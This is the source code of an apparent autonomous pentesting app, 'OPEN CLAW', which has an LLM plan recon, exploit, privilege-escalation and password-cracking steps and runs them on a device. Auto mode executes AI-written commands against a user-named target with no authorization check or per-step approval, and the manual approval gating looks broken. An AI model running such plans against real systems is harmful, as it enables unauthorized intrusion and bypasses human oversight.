  { id: 'encrypt-file', name: 'Encrypt File', category: 'utility', description: 'Encrypt files with GPG or OpenSSL', commands: ['gpg -c {file}', 'openssl enc -aes-256-cbc -salt -in {file} -out {file}.enc', 'openssl enc -aes-256-cbc -d -in {file}.enc -out {file}'], installCmd: 'pkg install gnupg openssl-tool', dangerLevel: 'low', tags: ['encrypt', 'gpg', 'openssl', 'aes'] },
  { id: 'decrypt-file', name: 'Decrypt File', category: 'utility', description: 'Decrypt encrypted files', commands: ['gpg -d {file}.gpg > {file}', 'openssl enc -aes-256-cbc -d -in {file}.enc -out {file}'], installCmd: 'pkg install gnupg openssl-tool', dangerLevel: 'low', tags: ['decrypt', 'gpg', 'openssl'] },
  { id: 'screenshot', name: 'Screenshot', category: 'utility', description: 'Capture screen on local device', commands: ['scrot /sdcard/screenshot.png', 'screencap -p /sdcard/screen.png', 'termux-media-scan /sdcard/screenshot.png'], installCmd: 'pkg install scrot', dangerLevel: 'low', tags: ['screenshot', 'screen', 'capture'] },
  { id: 'sys-info', name: 'System Info', category: 'utility', description: 'Gather comprehensive system information', commands: ['uname -a && cat /etc/os-release', 'df -h && free -h', 'lscpu && lsusb 2>/dev/null'], installCmd: '', dangerLevel: 'low', tags: ['system', 'info', 'enumerate', 'recon'] },
];

/* ═══════════════════════════════════════════════════════════════════
   PRESET MISSIONS
   ═══════════════════════════════════════════════════════════════════ */

const PRESET_MISSIONS: PresetMission[] = [
  { id: 'full-recon', label: 'Full Network Recon', icon: <Radar size={14} />, prompt: 'Perform a full network reconnaissance on the local network. Discover all live hosts, open ports, running services, and OS fingerprints. Use nmap, ARP scan, and service enumeration.', description: 'Host discovery + port scan + service enum', risk: 'medium' },
  { id: 'web-pentest', label: 'Web App Pentest', icon: <Globe size={14} />, prompt: 'Conduct a full web application penetration test. Check for OWASP Top 10 vulnerabilities including SQL injection, XSS, CSRF, insecure headers, SSL issues, and directory traversal.', description: 'OWASP Top 10 vulnerability assessment', risk: 'high' },
  { id: 'wifi-audit', label: 'WiFi Security Audit', icon: <Wifi size={14} />, prompt: 'Audit WiFi security. Scan for nearby networks, identify encryption types, check for WPS vulnerabilities, and assess signal strength.', description: 'Network scan + encryption analysis', risk: 'medium' },
  { id: 'osint-investigate', label: 'OSINT Investigation', icon: <Search size={14} />, prompt: 'Perform OSINT investigation on a target. Harvest emails, discover subdomains, geolocate IPs, and gather domain intelligence using passive techniques.', description: 'Email + subdomain + domain recon', risk: 'low' },
  { id: 'privesc-checklist', label: 'PrivEsc Checklist', icon: <KeyRound size={14} />, prompt: 'Run a comprehensive privilege escalation checklist. Check SUID binaries, capabilities, cron jobs, kernel version, writable paths, and common misconfigurations.', description: 'SUID + capabilities + kernel check', risk: 'high' },
  { id: 'vuln-assess', label: 'Vulnerability Assessment', icon: <Shield size={14} />, prompt: 'Perform automated vulnerability assessment on a target. Run nikto, nuclei, and nmap vulnerability scripts to identify known CVEs and misconfigurations.', description: 'Nikto + nuclei + nmap vuln scan', risk: 'medium' },
  { id: 'password-audit', label: 'Password Audit', icon: <Lock size={14} />, prompt: 'Audit password security. Check for weak SSH configs, test hash cracking against common passwords, and analyze password policies.', description: 'Hash analysis + policy check', risk: 'high' },
  { id: 'custom', label: 'Custom Target...', icon: <Target size={14} />, prompt: '', description: 'Define your own mission objective', risk: 'low' },
];

/* ═══════════════════════════════════════════════════════════════════
   AI PROMPT BUILDERS
   ═══════════════════════════════════════════════════════════════════ */

const buildPlanningPrompt = (objective: string): string => {
  const skillList = SKILLS_DB.map(s => `- ${s.id}: ${s.name} (${s.category}) — ${s.description} — Commands: ${s.commands[0]}`).join('\n');
  return `You are OPEN CLAW — an autonomous security operations agent. Given a task objective, create a precise execution plan using the available skills database.

OBJECTIVE: ${objective}

AVAILABLE SKILLS:
${skillList}

RESPOND ONLY WITH VALID JSON in this exact format (no markdown, no code fences):
{"objective": "...", "steps": [{"skill_id": "...", "name": "...", "command": "exact command to run (use {target}, {url}, {domain}, {host}, {ip}, {port}, {wordlist} as placeholders where needed)", "description": "what this step accomplishes", "category": "..."}], "estimated_time": "...", "risk_level": "low|medium|high|critical"}

RULES:
- Only use skills from the available list above (use skill_id field values exactly)
- Provide EXACT commands that can be executed in Termux/Android terminal
- Maximum 8 steps per mission — prioritize highest value steps
- Order steps logically: recon before exploit, scan before attack
- Use placeholder variables like {target} for user-provided values
- If target needs to be specified, use "192.168.1.1" as default or "{target}"
- Include installation commands as separate steps if tools are needed`;
};

const buildAnalysisPrompt = (results: string): string => `You are OPEN CLAW — autonomous security agent. Analyze these execution results and provide a comprehensive security assessment.

EXECUTION RESULTS:
${results}

Provide your analysis in this format:
## Security Assessment

### Key Findings
- Finding 1
- Finding 2

### Risk Assessment
[Low/Medium/High/Critical] — brief explanation

### Recommendations
1. Recommendation 1
2. Recommendation 2

### Next Steps
- Suggested follow-up actions

### Commands Summary
Table of all commands executed with their purpose and outcome.`;

/* ═══════════════════════════════════════════════════════════════════
   HELPER: skill category counts
   ═══════════════════════════════════════════════════════════════════ */

const CATEGORIES_ORDERED: SkillCategory[] = ['recon', 'exploit', 'web', 'privesc', 'osint', 'wireless', 'crypto', 'forensics', 'network', 'post-exploit', 'utility'];

/* ═══════════════════════════════════════════════════════════════════
   COMPONENT
   ═══════════════════════════════════════════════════════════════════ */

export const OpenClawAgent: React.FC<OpenClawAgentProps> = ({
  onExecuteCommand,
  onRunInTerminal,
}) => {
  /* ── State ── */
  const [objective, setObjective] = useState('');
  const [execMode, setExecMode] = useState<ExecMode>('auto');
  const [phase, setPhase] = useState<AgentPhase>('idle');
  const [currentPlan, setCurrentPlan] = useState<AgentPlan | null>(null);
  const [logs, setLogs] = useState<ExecutionLogEntry[]>([]);
  const [missionHistory, setMissionHistory] = useState<MissionResult[]>([]);
  const [activeSection, setActiveSection] = useState<'console' | 'skills' | 'history'>('console');
  const [showSkillsPanel, setShowSkillsPanel] = useState(false);
  const [selectedSkill, setSelectedSkill] = useState<Skill | null>(null);
  const [skillSearch, setSkillSearch] = useState('');
  const [skillCatFilter, setSkillCatFilter] = useState<SkillCategory | 'all'>('all');
  const [skillDangerFilter, setSkillDangerFilter] = useState<DangerLevel | 'all'>('all');
  const [pendingStepApproval, setPendingStepApproval] = useState(false);
  const [analysisReport, setAnalysisReport] = useState<string>('');
  const [paused, setPaused] = useState(false);
  const [cancelled, setCancelled] = useState(false);
  const [targetInput, setTargetInput] = useState('');
  const [showTargetInput, setShowTargetInput] = useState(false);
  const [copiedReport, setCopiedReport] = useState(false);
  const consoleEndRef = useRef<HTMLDivElement>(null);
  const abortRef = useRef(false);

  /* ── Derived ── */
  const filteredSkills = useMemo(() => {
    return SKILLS_DB.filter(s => {
      if (skillCatFilter !== 'all' && s.category !== skillCatFilter) return false;
      if (skillDangerFilter !== 'all' && s.dangerLevel !== skillDangerFilter) return false;
      if (skillSearch && !s.name.toLowerCase().includes(skillSearch.toLowerCase()) &&
          !s.description.toLowerCase().includes(skillSearch.toLowerCase()) &&
          !s.tags.some(t => t.includes(skillSearch.toLowerCase()))) return false;
      return true;
    });
  }, [skillSearch, skillCatFilter, skillDangerFilter]);

  const skillsByCategory = useMemo(() => {
    const map: Record<string, Skill[]> = {};
    for (const cat of CATEGORIES_ORDERED) {
      const skills = filteredSkills.filter(s => s.category === cat);
      if (skills.length > 0) map[cat] = skills;
    }
    return map;
  }, [filteredSkills]);

  const currentStepIndex = currentPlan?.steps.findIndex(s => s.status === 'running' || s.status === 'pending') ?? -1;

  /* ── Effects ── */
  useEffect(() => {
    consoleEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  /* ── Helpers ── */
  const addLog = useCallback((phase: AgentPhase, message: string, detail?: string, skillId?: string) => {
    setLogs(prev => [...prev, { timestamp: Date.now(), phase, message, detail, skillId }]);
  }, []);

  const resolveCommand = (cmd: string): string => {
    return cmd
      .replace(/\{target\}/g, targetInput || '127.0.0.1')
      .replace(/\{url\}/g, targetInput?.startsWith('http') ? targetInput : `http://${targetInput || '127.0.0.1'}`)
      .replace(/\{domain\}/g, targetInput || 'example.com')
      .replace(/\{host\}/g, targetInput || '127.0.0.1')
      .replace(/\{ip\}/g, targetInput || '127.0.0.1')
      .replace(/\{port\}/g, '4444')
      .replace(/\{channel\}/g, '6')
      .replace(/\{bssid\}/g, '00:00:00:00:00:00')
      .replace(/\{client\}/g, '00:00:00:00:00:00')
      .replace(/\{wordlist\}/g, '/usr/share/wordlists/common.txt')
      .replace(/\{file\}/g, '/tmp/target')
      .replace(/\{username\}/g, targetInput || 'admin')
      .replace(/\{query\}/g, targetInput || 'org:"Example Inc"')
      .replace(/\{user\}/g, 'root')
      .replace(/\{password\}/g, 'password123')
      .replace(/\{subnet\}/g, targetInput ? targetInput.replace(/\d+$/, '0/24') : '192.168.1.0/24')
      .replace(/\{jump_host\}/g, targetInput || '192.168.1.1')
      .replace(/\{remote_port\}/g, '80')
      .replace(/\{local_port\}/g, '8080')
      .replace(/\{server\}/g, targetInput || '192.168.1.1');
  };

  const getSkill = (id: string): Skill | undefined => SKILLS_DB.find(s => s.id === id);

  const timestamp = () => {
    const d = new Date();
    return `${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}:${String(d.getSeconds()).padStart(2, '0')}.${String(d.getMilliseconds()).padStart(3, '0')}`;
  };

  /* ── Core Agent Loop ── */
  const runMission = async (obj: string) => {
    abortRef.current = false;
    setCancelled(false);
    setPaused(false);
    setCurrentPlan(null);
    setLogs([]);
    setAnalysisReport('');
    setPendingStepApproval(false);
    setActiveSection('console');

    const missionId = `mission-${Date.now()}`;
    const missionLogs: ExecutionLogEntry[] = [];

    const captureLog = (phase: AgentPhase, message: string, detail?: string, skillId?: string) => {
      const entry: ExecutionLogEntry = { timestamp: Date.now(), phase, message, detail, skillId };
      missionLogs.push(entry);
      addLog(phase, message, detail, skillId);
    };

    // ── Phase 1: Planning ──
    setPhase('planning');
    captureLog('planning', 'Initializing OPEN CLAW agent...');
    await new Promise(r => setTimeout(r, 400));
    captureLog('planning', `Objective received: ${obj}`);
    await new Promise(r => setTimeout(r, 300));
    captureLog('planning', 'Sending objective to AI planner...');
    captureLog('planning', `Skills database loaded: ${SKILLS_DB.length} skills across ${CATEGORIES_ORDERED.length} categories`);

    let plan: AgentPlan;
    try {
      const res = await fetch('/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          messages: [{ role: 'user', content: buildPlanningPrompt(obj) }],
        }),
      });
      const data = await res.json();
      const content = data.response || data.content || data.message || '';

      // Try to parse JSON from response
      const jsonMatch = content.match(/\{[\s\S]*\}/);
      if (!jsonMatch) throw new Error('AI did not return a valid plan');
      plan = JSON.parse(jsonMatch[0]);

      if (!plan.steps || !Array.isArray(plan.steps) || plan.steps.length === 0) {
        throw new Error('AI returned an empty plan');
      }

      // Ensure all steps have status
      plan.steps = plan.steps.map((s, i) => ({
        ...s,
        status: 'pending' as const,
        command: resolveCommand(s.command),
      }));

      setCurrentPlan(plan);
      captureLog('planning', `Plan generated: ${plan.steps.length} steps | Risk: ${plan.risk_level} | ETA: ${plan.estimated_time}`);
    } catch (err: any) {
      captureLog('error', `Planning failed: ${err.message}`);
      setPhase('error');
      setMissionHistory(prev => [...prev, { id: missionId, objective: obj, plan: { objective: obj, steps: [], estimated_time: '', risk_level: '' }, logs: missionLogs, status: 'error' }]);
      return;
    }

    await new Promise(r => setTimeout(r, 500));

    // ── Phase 2: Skill Fetch ──
    setPhase('skill_fetch');
    for (const step of plan.steps) {
      if (abortRef.current) break;
      const skill = getSkill(step.skill_id);
      captureLog('skill_fetch', `Loading skill: ${step.name}`, skill ? `${skill.description} [${skill.dangerLevel.toUpperCase()}]` : 'Custom skill', step.skill_id);
      await new Promise(r => setTimeout(r, 300));
    }
    captureLog('skill_fetch', 'All skills loaded into execution pipeline');

    await new Promise(r => setTimeout(r, 400));

    // ── Phase 3: Execution ──
    setPhase('executing');
    captureLog('executing', `Starting execution in ${execMode.toUpperCase()} mode...`);

    const allResults: string[] = [];

    for (let i = 0; i < plan.steps.length; i++) {
      if (abortRef.current) break;

      // Wait if paused
      while (paused && !abortRef.current) {
        await new Promise(r => setTimeout(r, 200));
      }
      if (abortRef.current) break;

      const step = plan.steps[i];

      // Manual mode: wait for approval
      if (execMode === 'manual' && i > 0) {
        setPendingStepApproval(true);
        captureLog('executing', `⏸ Awaiting approval for step ${i + 1}: ${step.name}`, `Command: ${step.command}`);
        while (pendingStepApproval && !abortRef.current) {
          await new Promise(r => setTimeout(r, 200));
        }
        if (abortRef.current) break;
        setPendingStepApproval(false);
      }

      // Update step status
      setCurrentPlan(prev => prev ? {
        ...prev,
        steps: prev.steps.map((s, j) => j === i ? { ...s, status: 'running' } : s),
      } : null);

      captureLog('executing', `[${i + 1}/${plan.steps.length}] Running: ${step.name}`, step.command, step.skill_id);

      try {
        const output = await onExecuteCommand(step.command);
        const result = output || '(no output)';
        allResults.push(`=== Step ${i + 1}: ${step.name} ===\nCommand: ${step.command}\nOutput:\n${result}`);

        setCurrentPlan(prev => prev ? {
          ...prev,
          steps: prev.steps.map((s, j) => j === i ? { ...s, status: 'done', output: result } : s),
        } : null);

        const outputPreview = result.length > 200 ? result.slice(0, 200) + '...' : result;
        captureLog('executing', `✓ Step ${i + 1} completed`, outputPreview.replace(/\n/g, ' '));
      } catch (err: any) {
        allResults.push(`=== Step ${i + 1}: ${step.name} (FAILED) ===\nError: ${err.message}`);
        setCurrentPlan(prev => prev ? {
          ...prev,
          steps: prev.steps.map((s, j) => j === i ? { ...s, status: 'error', output: `Error: ${err.message}` } : s),
        } : null);
        captureLog('executing', `✗ Step ${i + 1} failed: ${err.message}`);
      }

      await new Promise(r => setTimeout(r, 500));
    }

    if (abortRef.current) {
      captureLog('error', 'Mission cancelled by user');
      setPhase('error');
      setMissionHistory(prev => [...prev, { id: missionId, objective: obj, plan, logs: missionLogs, status: 'cancelled' }]);
      return;
    }

    // ── Phase 4: Analysis ──
    setPhase('analyzing');
    captureLog('analyzing', 'Feeding execution results to AI analyzer...');
    await new Promise(r => setTimeout(r, 500));

    try {
      const res = await fetch('/api/chat', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          messages: [{ role: 'user', content: buildAnalysisPrompt(allResults.join('\n\n')) }],
        }),
      });
      const data = await res.json();
      const report = data.response || data.content || 'Analysis could not be generated.';
      setAnalysisReport(report);
      captureLog('analyzing', 'Analysis complete — generating report...');
    } catch (err: any) {
      setAnalysisReport(`Analysis failed: ${err.message}\n\nRaw results:\n${allResults.join('\n\n---\n\n')}`);
      captureLog('error', `Analysis failed: ${err.message}`);
    }

    // ── Phase 5: Report ──
    setPhase('reporting');
    captureLog('reporting', 'Mission report generated');
    await new Promise(r => setTimeout(r, 300));

    setPhase('completed');
    captureLog('completed', '✓ OPEN CLAW mission complete');

    setMissionHistory(prev => [...prev, {
      id: missionId,
      objective: obj,
      plan,
      logs: missionLogs,
      analysis: analysisReport,
      completedAt: Date.now(),
      status: 'completed',
    }]);
  };

  const handleStartMission = () => {
    if (!objective.trim()) return;
    if (showTargetInput && !targetInput.trim()) return;
    runMission(objective.trim());
  };

  const handlePresetMission = (mission: PresetMission) => {
    if (mission.id === 'custom') {
      setObjective('');
      setTargetInput('');
      setShowTargetInput(true);
      return;
    }
    setObjective(mission.prompt);
    setShowTargetInput(true);
  };

  const handleApproveStep = () => setPendingStepApproval(false);

  const handleSkipStep = () => {
    if (!currentPlan) return;
    const idx = currentPlan.steps.findIndex(s => s.status === 'pending');
    if (idx >= 0) {
      setCurrentPlan(prev => prev ? {
        ...prev,
        steps: prev.steps.map((s, j) => j === idx ? { ...s, status: 'skipped' } : s),
      } : null);
      setPendingStepApproval(false);
    }
  };

  const handleCancelMission = () => {
    abortRef.current = true;
    setCancelled(true);
    setPaused(false);
    setPendingStepApproval(false);
  };

  const handlePauseResume = () => setPaused(p => !p);

  const handleClearConsole = () => { setLogs([]); setCurrentPlan(null); setPhase('idle'); setAnalysisReport(''); };

  const handleExportReport = () => {
    const text = [
      `═══ OPEN CLAW MISSION REPORT ═══`,
      `Date: ${new Date().toISOString()}`,
      `Objective: ${currentPlan?.objective || 'N/A'}`,
      `Status: ${phase}`,
      `Risk Level: ${currentPlan?.risk_level || 'N/A'}`,
      ``,
      `── EXECUTION LOG ──`,
      ...logs.map(l => `[${new Date(l.timestamp).toISOString()}] [${l.phase.toUpperCase()}] ${l.message}${l.detail ? ` | ${l.detail}` : ''}`),
      ``,
      `── STEPS ──`,
      ...(currentPlan?.steps.map((s, i) => `  ${i + 1}. [${s.status?.toUpperCase()}] ${s.name}: ${s.command}\n     ${s.description}\n     Output: ${(s.output || '').slice(0, 300)}`) || []),
      ``,
      `── ANALYSIS ──`,
      analysisReport || 'No analysis available',
    ].join('\n');

    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `open-claw-${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const handleExecuteSkill = (skill: Skill) => {
    if (skill.commands.length > 0) {
      const cmd = resolveCommand(skill.commands[0]);
      onRunInTerminal(cmd);
    }
  };

  const copyReportToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(analysisReport);
      setCopiedReport(true);
      setTimeout(() => setCopiedReport(false), 2000);
    } catch { /* ignore */ }
  };

  const isRunning = ['planning', 'skill_fetch', 'executing', 'analyzing', 'reporting'].includes(phase);

  /* ═════════════════════════════════════════════════════════════════
     RENDER
     ═════════════════════════════════════════════════════════════════ */
  return (
    <div className="flex flex-col h-full font-mono" style={{ background: BG_DARK, color: '#e0e0e0' }}>
      {/* ── Scanline overlay ── */}
      <div className="absolute inset-0 pointer-events-none z-50 scanline opacity-30" />

      {/* ═══ HEADER ═══ */}
      <div className="flex items-center justify-between px-3 py-2.5 border-b shrink-0 z-40"
        style={{ background: BG_CARD, borderColor: 'rgba(255,255,255,0.06)' }}>
        <div className="flex items-center gap-2.5">
          <div className="w-8 h-8 flex items-center justify-center relative"
            style={{ background: `linear-gradient(135deg, ${ORANGE}, #cc3300)`, boxShadow: `0 0 20px ${ORANGE}44` }}>
            <Shield size={16} className="text-white" />
            {isRunning && (
              <div className="absolute inset-0 border animate-pulse" style={{ borderColor: NEON_GREEN }} />
            )}
          </div>
          <div>
            <h2 className="text-[12px] font-bold uppercase tracking-wider flex items-center gap-2" style={{ color: ORANGE }}>
              OPEN CLAW
              <span className="text-[7px] px-1.5 py-0.5 border font-black tracking-widest"
                style={{ color: NEON_GREEN, borderColor: `${NEON_GREEN}33`, background: `${NEON_GREEN}11` }}>
                AUTONOMOUS
              </span>
            </h2>
            <div className="flex items-center gap-1.5">
              <div className={cn(
                "w-1.5 h-1.5",
                phase === 'idle' ? 'bg-gray-600' :
                phase === 'completed' ? 'animate-pulse' :
                phase === 'error' ? 'bg-red-500' :
                'animate-pulse'
              )} style={phase === 'completed' ? { background: NEON_GREEN, boxShadow: `0 0 6px ${NEON_GREEN}` } : phase === 'idle' ? {} : { background: ORANGE, boxShadow: `0 0 6px ${ORANGE}` }} />
              <span className="text-[8px] uppercase tracking-[0.15em] font-bold"
                style={{ color: PHASE_LABELS[phase].color }}>
                {PHASE_LABELS[phase].label}
              </span>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-1">
          {/* Section tabs */}
          {(['console', 'skills', 'history'] as const).map(s => (
            <button key={s} onClick={() => setActiveSection(s)}
              className={cn(
                "px-2 py-1 text-[8px] uppercase tracking-widest font-bold transition-colors border",
                activeSection === s
                  ? "text-white border-white/20"
                  : "text-gray-600 border-transparent hover:text-gray-400"
              )}>
              {s}
            </button>
          ))}
          <div className="w-px h-4 mx-1" style={{ background: 'rgba(255,255,255,0.08)' }} />
          <button onClick={handleExportReport} className="p-1.5 text-gray-500 hover:text-white transition-colors" title="Export Report">
            <Download size={14} />
          </button>
          <button onClick={handleClearConsole} className="p-1.5 text-gray-500 hover:text-white transition-colors" title="Clear Console">
            <Trash2 size={14} />
          </button>
        </div>
      </div>

      {/* ═══ PHASE PROGRESS BAR ═══ */}
      {isRunning && (
        <div className="flex items-center gap-0 px-3 py-1.5 border-b shrink-0 overflow-x-auto no-scrollbar"
          style={{ background: 'rgba(0,0,0,0.6)', borderColor: 'rgba(255,255,255,0.04)' }}>
          {(['planning', 'skill_fetch', 'executing', 'analyzing', 'reporting'] as const).map((p, i) => {
            const phaseOrder = ['planning', 'skill_fetch', 'executing', 'analyzing', 'reporting'];
            const currentIdx = phaseOrder.indexOf(phase);
            const isActive = p === phase;
            const isDone = currentIdx > i;
            return (
              <React.Fragment key={p}>
                {i > 0 && <div className="w-4 h-px shrink-0" style={{ background: isDone ? NEON_GREEN : 'rgba(255,255,255,0.1)' }} />}
                <div className="flex items-center gap-1.5 shrink-0">
                  <div className={cn(
                    "w-5 h-5 flex items-center justify-center border transition-all",
                    isActive ? "animate-pulse" : ""
                  )} style={{
                    borderColor: isActive ? ORANGE : isDone ? NEON_GREEN : 'rgba(255,255,255,0.1)',
                    background: isActive ? `${ORANGE}22` : isDone ? `${NEON_GREEN}15` : 'transparent',
                    color: isDone ? NEON_GREEN : isActive ? ORANGE : 'rgba(255,255,255,0.2)',
                  }}>
                    {isDone ? <CheckCircle2 size={11} /> : PHASE_LABELS[p].icon}
                  </div>
                  <span className="text-[7px] uppercase tracking-widest font-bold hidden sm:block"
                    style={{ color: isActive ? ORANGE : isDone ? NEON_GREEN : 'rgba(255,255,255,0.2)' }}>
                    {PHASE_LABELS[p].label}
                  </span>
                </div>
              </React.Fragment>
            );
          })}
        </div>
      )}

      {/* ═══ CONTENT ═══ */}
      <div className="flex-1 overflow-hidden relative z-10">

        {/* ═══ CONSOLE SECTION ═══ */}
        {activeSection === 'console' && (
          <div className="flex flex-col h-full">

            {/* ── Mission Input (shown when idle) ── */}
            {!isRunning && phase !== 'completed' && !missionHistory.length && (
              <div className="p-3 space-y-3 border-b" style={{ borderColor: 'rgba(255,255,255,0.04)' }}>
                {/* Objective input */}
                <div className="space-y-2">
                  <label className="text-[8px] uppercase tracking-[0.2em] font-bold" style={{ color: ORANGE }}>
                    Mission Objective
                  </label>
                  <textarea
                    value={objective}
                    onChange={e => setObjective(e.target.value)}
                    placeholder="Describe what you want to accomplish..."
                    rows={2}
                    className="w-full text-xs p-2.5 resize-none outline-none transition-colors"
                    style={{ background: BG_CARD, border: `1px solid ${ORANGE}33`, color: '#e0e0e0' }}
                  />
                </div>

                {/* Target input */}
                <div className="space-y-1.5">
                  <label className="text-[8px] uppercase tracking-[0.2em] font-bold text-gray-500">
                    Target (IP / URL / Domain / Username)
                  </label>
                  <input
                    value={targetInput}
                    onChange={e => setTargetInput(e.target.value)}
                    placeholder="e.g. 192.168.1.1, https://example.com, victim@email.com"
                    className="w-full text-xs p-2 outline-none transition-colors"
                    style={{ background: BG_CARD, border: '1px solid rgba(255,255,255,0.08)', color: '#e0e0e0' }}
                  />
                </div>

                {/* Mode selector + Launch */}
                <div className="flex items-center gap-2">
                  <div className="flex border overflow-hidden" style={{ borderColor: 'rgba(255,255,255,0.08)' }}>
                    {(['auto', 'manual'] as const).map(m => (
                      <button key={m} onClick={() => setExecMode(m)}
                        className={cn("px-3 py-1.5 text-[8px] uppercase tracking-widest font-bold transition-colors",
                          execMode === m ? "text-black" : "text-gray-500"
                        )}
                        style={execMode === m ? { background: ORANGE } : { background: BG_CARD }}>
                        {m === 'auto' ? <span className="flex items-center gap-1"><Zap size={10} /> Auto</span> : <span className="flex items-center gap-1"><Activity size={10} /> Manual</span>}
                      </button>
                    ))}
                  </div>
                  <button onClick={handleStartMission}
                    disabled={!objective.trim()}
                    className="flex-1 flex items-center justify-center gap-2 py-2 text-[10px] uppercase tracking-widest font-bold text-black transition-all disabled:opacity-30"
                    style={{ background: `linear-gradient(135deg, ${ORANGE}, #cc3300)`, boxShadow: objective.trim() ? `0 0 20px ${ORANGE}44` : 'none' }}>
                    <Play size={13} /> Launch Mission
                  </button>
                </div>

                {/* Preset Missions */}
                <div className="space-y-2">
                  <label className="text-[8px] uppercase tracking-[0.2em] font-bold text-gray-600">
                    Quick Deploy — Preset Missions
                  </label>
                  <div className="grid grid-cols-2 gap-1.5">
                    {PRESET_MISSIONS.map(m => (
                      <button key={m.id} onClick={() => handlePresetMission(m)}
                        className="flex items-center gap-2 p-2 text-left transition-colors border"
                        style={{ background: BG_CARD, borderColor: 'rgba(255,255,255,0.04)' }}>
                        <div style={{ color: DANGER_STYLES[m.risk].includes('green') ? NEON_GREEN : DANGER_STYLES[m.risk].includes('yellow') ? '#facc15' : DANGER_STYLES[m.risk].includes('orange') ? ORANGE : '#f87171' }}>
                          {m.icon}
                        </div>
                        <div className="min-w-0">
                          <p className="text-[9px] font-bold text-gray-300 truncate">{m.label}</p>
                          <p className="text-[7px] text-gray-600 truncate">{m.description}</p>
                        </div>
                      </button>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* ── Execution Console ── */}
            <div className="flex-1 overflow-y-auto custom-scrollbar p-3 space-y-1.5 relative"
              style={{ background: isRunning ? 'rgba(0,0,0,0.8)' : 'transparent' }}>
              {/* Pulsing border during execution */}
              {isRunning && (
                <div className="absolute inset-0 pointer-events-none border animate-pulse"
                  style={{ borderColor: `${ORANGE}22`, borderRadius: 0 }} />
              )}

              {logs.length === 0 && (
                <div className="flex flex-col items-center justify-center h-full text-center space-y-4 px-4">
                  <div className="relative">
                    <div className="absolute inset-0 blur-3xl opacity-20" style={{ background: ORANGE }} />
                    <div className="relative w-16 h-16 flex items-center justify-center"
                      style={{ background: `linear-gradient(135deg, ${ORANGE}, #cc3300)`, boxShadow: `0 0 40px ${ORANGE}33` }}>
                      <Shield size={28} className="text-white" />
                    </div>
                  </div>
                  <div className="space-y-1">
                    <h3 className="text-lg font-bold uppercase tracking-wider" style={{ color: ORANGE }}>
                      Open Claw
                    </h3>
                    <p className="text-[10px] text-gray-600 uppercase tracking-[0.15em]">
                      Autonomous Security Operations Agent
                    </p>
                    <p className="text-[9px] text-gray-700 mt-2">
                      {SKILLS_DB.length} skills loaded • {CATEGORIES_ORDERED.length} categories • Ready to deploy
                    </p>
                  </div>
                </div>
              )}

              {logs.map((log, i) => {
                const phaseStyle = PHASE_LABELS[log.phase];
                return (
                  <motion.div
                    key={i}
                    initial={{ opacity: 0, x: -4 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ duration: 0.15 }}
                    className="flex gap-2 text-[10px]"
                  >
                    <span className="text-gray-700 shrink-0 select-none w-16 text-right tabular-nums">{timestamp()}</span>
                    <span className="shrink-0 font-bold w-20 text-right tabular-nums" style={{ color: phaseStyle.color }}>
                      {log.phase === 'completed' ? 'DONE' : log.phase === 'executing' ? 'EXEC' : log.phase === 'skill_fetch' ? 'LOAD' : log.phase.toUpperCase().slice(0, 6)}
                    </span>
                    <span className="whitespace-pre-wrap leading-relaxed flex-1" style={{ color: log.phase === 'error' ? '#f87171' : log.phase === 'completed' ? NEON_GREEN : '#b0b0b0' }}>
                      {log.message}
                    </span>
                  </motion.div>
                );
              })}

              {/* Step cards during execution */}
              {currentPlan && currentPlan.steps.length > 0 && (
                <div className="mt-4 space-y-1.5">
                  <div className="text-[8px] uppercase tracking-[0.2em] font-bold text-gray-600 pb-1 border-b" style={{ borderColor: 'rgba(255,255,255,0.06)' }}>
                    Execution Steps ({currentPlan.steps.filter(s => s.status === 'done' || s.status === 'skipped').length}/{currentPlan.steps.length})
                  </div>
                  {currentPlan.steps.map((step, i) => {
                    const skill = getSkill(step.skill_id);
                    return (
                      <motion.div
                        key={i}
                        initial={{ opacity: 0, y: 4 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: i * 0.05 }}
                        className="border p-2"
                        style={{
                          background: step.status === 'running' ? `${ORANGE}0a` : step.status === 'done' ? `${NEON_GREEN}06` : step.status === 'error' ? 'rgba(248,113,113,0.05)' : BG_CARD,
                          borderColor: step.status === 'running' ? `${ORANGE}44` : step.status === 'done' ? `${NEON_GREEN}22` : step.status === 'error' ? 'rgba(248,113,113,0.2)' : 'rgba(255,255,255,0.04)',
                        }}
                      >
                        <div className="flex items-center gap-2">
                          <div className="w-4 h-4 flex items-center justify-center shrink-0" style={{
                            color: step.status === 'done' ? NEON_GREEN : step.status === 'running' ? ORANGE : step.status === 'error' ? '#f87171' : step.status === 'skipped' ? '#6b7280' : '#3f3f46',
                          }}>
                            {step.status === 'done' ? <CheckCircle2 size={14} /> :
                             step.status === 'running' ? <Loader2 size={14} className="animate-spin" /> :
                             step.status === 'error' ? <X size={14} /> :
                             step.status === 'skipped' ? <SkipForward size={14} /> :
                             <CircleDot size={14} />}
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2">
                              <span className="text-[9px] font-bold text-gray-300 truncate">{step.name}</span>
                              {skill && (
                                <span className={cn("text-[7px] px-1 py-0.5 border font-bold uppercase", DANGER_STYLES[skill.dangerLevel])}>
                                  {skill.dangerLevel}
                                </span>
                              )}
                            </div>
                            <code className="text-[8px] text-gray-600 block truncate">{step.command}</code>
                          </div>
                          {step.status === 'running' && execMode === 'manual' && i > 0 && pendingStepApproval && (
                            <div className="flex gap-1 shrink-0">
                              <button onClick={handleApproveStep}
                                className="px-2 py-1 text-[7px] uppercase font-bold"
                                style={{ background: `${NEON_GREEN}22`, color: NEON_GREEN, border: `1px solid ${NEON_GREEN}44` }}>
                                Approve
                              </button>
                              <button onClick={handleSkipStep}
                                className="px-2 py-1 text-[7px] uppercase font-bold text-gray-500 border border-gray-700">
                                Skip
                              </button>
                            </div>
                          )}
                        </div>
